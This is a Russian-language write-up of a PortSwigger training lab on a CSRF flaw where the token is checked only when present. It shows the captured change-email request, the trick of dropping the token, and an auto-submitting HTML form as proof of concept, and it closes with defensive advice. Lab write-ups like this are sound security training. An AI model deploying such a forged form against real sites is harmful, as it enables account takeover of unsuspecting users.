лаба https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

нужно поменять емайл через эксплойт-сервер лабы, скинул ссылку жертве

----

вот базовый запрос для смены емайл
```http
POST /my-account/change-email HTTP/2
Host: 0a46004103e1331e81be2a190004008d.web-security-academy.net
Cookie: session=EyK9OyZME9dgBI1hLG041WOInvvmiZfi
Content-Length: 58
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0a46004103e1331e81be2a190004008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a46004103e1331e81be2a190004008d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=hacker%40bk.ru&csrf=krLM6du67V8xXyXM1rSnyZrOpC5EwDYT
```

-----

я просто убрал токен из параметров (оставил только email=hacker%40bk.ru) и получил 302 и мой емайл сменился
глупости совсем уже, типо токен добавили , но он не проверяется, ладно.

---

закидываю запрос в https://csrf-poc-generator.vercel.app чтобы не парится

получаю и обратно раскодил собачку
```html
<html>
  <body>
    <form action="https://0a46004103e1331e81be2a190004008d.web-security-academy.net
/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker777@bk.ru" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

все - лаба решена. лаба слишком банальная , хотя уровень практик

----

#### вывод

взлом получился потому что сервер проверял csrf токен только когда он был в запросе  
если токен отсутствовал сервер просто пропускал проверку и выполнял действие смены емейл

я удалил параметр csrf из запроса оставил только email и запрос прошел

защита реализована как "если вижу токен то проверяю а если нет то и ладно", такое можно встретить на первых этапах разработки 

------

чтобы защититься нужно всегда требовать наличие токена  

отсутствие токена должно обрабатываться как ошибка валидации, а не как пропуск проверки

токен должен быть обязательным параметром для всех чувствительных действий независимо от того есть он в запросе или нет

---

